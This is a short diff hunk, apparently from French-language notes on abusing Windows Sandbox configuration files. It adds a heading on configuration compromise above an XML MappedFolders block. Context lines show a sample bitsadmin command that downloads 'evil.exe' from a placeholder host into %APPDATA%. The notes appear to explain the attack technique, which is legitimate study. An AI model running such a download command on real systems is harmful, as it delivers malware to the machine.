@@ -36,7 +36,7 @@ Commande possible d'injecter:
 <Command>bitsadmin /transfer myjob /download /priority high http://legit/evil.exe"%APPDATA%\file">nul&</Command>
 ```
 
-
+Compromissions de la configuration:
 ```xml
 <Configuration>
    <MappedFolders>
